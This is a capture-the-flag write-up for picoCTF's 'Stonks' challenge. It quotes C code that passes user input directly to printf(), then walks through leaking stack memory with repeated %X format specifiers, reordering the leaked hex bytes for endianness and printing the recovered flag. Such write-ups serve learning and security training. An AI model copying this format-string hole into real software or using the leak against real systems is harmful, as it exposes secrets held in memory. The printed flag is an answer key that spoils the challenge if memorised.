# Description
I decided to try something no one else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! `vuln.c` 
`nc mercury.picoctf.net 16439`

**tags:Binary Exploitation**

## Notes
- Connect to the server `nc mercury.picoctf.net 16439`
- `cat vuln.c` parts that are interesting
```int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);
```
```// TODO: Figure out how to read token from the file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);
```

## Connecting to server
```nc mercury.picoctf.net 16439
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
```
Entering 2 will result :
```Portfolio as of Current_time

You don't own any stonks!
Goodbye!
```

Entering 1 will result :
```Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
```
- Whatever value you put in will get executed ( Input is the API? )

## Looking back at the code

```int buy_stonks(Portfolio *p) {
        if (!p) {
                return 1;
        }
        char api_buf[FLAG_BUFFER];
        FILE *f = fopen("api","r");
        if (!f) {
                printf("Flag file not found. Contact an admin.\n");
                exit(1);
        }
        fgets(api_buf, FLAG_BUFFER, f);
```

- From the snippet above, the API token looks to be the input.
- The ONLY validation is when the token isn't entered.

```// TODO: Figure out how to read token from file, for now just ask

        char *user_buf = malloc(300 + 1);
        printf("What is your API token?\n");
        scanf("%300s", user_buf);
        printf("Buying stonks with token:\n");
        printf(user_buf);
```

- Comment shows that the token is only being asked ( does not get checked )
- Memory space is created with `malloc()` for the API token
- The last line prints out the API token with `printf()`

## Input validation
print type specifiers for `printf()` :
Reference: 
https://cplusplus.com/reference/cstdio/printf/

Tried inputting different type specifiers: 
- `%p` for point address
Returned `0x9d7e410` - Converts into a text = `�~A`
- `%c` for character
Returned `�`
- `%x` for hexadecimal
Returned `809e3d0` - Converts into a text = `=`
- `%X` for hexadecimal uppercase
Returned `C`

- Tried inputting multiple `%X`s
Returned :
 `93CF3D0804B00080489C3F7FBBD80FFFFFFFF193CD160F7FC9110F7FBBDC7093CE180193CF3B093CF3D06F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E6263376365616336FFEB007DF7FF6AF8F7FC9440C3844B0010F7E58CE9F7FCA0C0F7FBB5C0F7FBB000FFEB7858F7E4968DF7FBB5C08048ECAFFEB78640F7FDDF09804B000F7FBB000F7FBBE20FFEB7898F7FE3D50F7FBC890C3844B00F7FBB000804B000FFEB78988048C8693CD160`

Converts into :

``^fî?°^`H^|?YØÿÿÿñ^fìgYÜp^fí^fî=nãðocip{FTC0l_I4_t5m_ll0m_y_y3nbc7ceac6ÿ^~}
÷ùJ^~÷ùJø÷öt@â÷ßlé÷ö^`À÷õ^uÀ÷õ^pÿ^~ÜH÷Þv^m÷õ^uÀ^`Hì¯ùíÅ@÷÷¿     
^`KYYâùíÈ^o`âùíÈ^o^aÕZ^i ¡ Y°ÿ^~Ü^h^`HÈhnÁ`ÿ^~Ütÿ^~Ü^h^`H¾^=Y?Àÿ^~Ý<ÿ^~Ý4``

- Looks like the flag is in it

Removed unnecessary bytes:
`6F6369707B465443306C5F49345F74356D5F6C6C306D5F795F79336E6263376365616336FF9E06FF9E007D`

Converts to : 
`ocip{FTC0l_I4_t5m_ll0m_y_y3nbc7ceac6ÿ}`
- Looks like it's using a different byte-order sequence.
- Tried converting endianness
    `}ÿÿ6caec7cbn3y_y_m0ll_m5t_4I_l0CTF{pico`
- Found the sequence order (8 bytes are flipped)
    E.g. First 8 bytes `6F 63 69 70` to `70 69 63 6F`
- Manually relocated bytes
`7069636F4354467B495F6C3035745F346C6C5F6D795F6D306E33795F63376362366361657D00957D009EFF`

Converts to :

**Flag found: picoCTF{I_l05t_4ll_my_m0n3y_c7cb6cae}^~ÿ**

Hexadecimal Converter: 
https://www.scadacore.com/tools/programming-calculators/online-hex-converer

Endianness Converter:
https://www.save-editor.com/tools/wse_hex.html
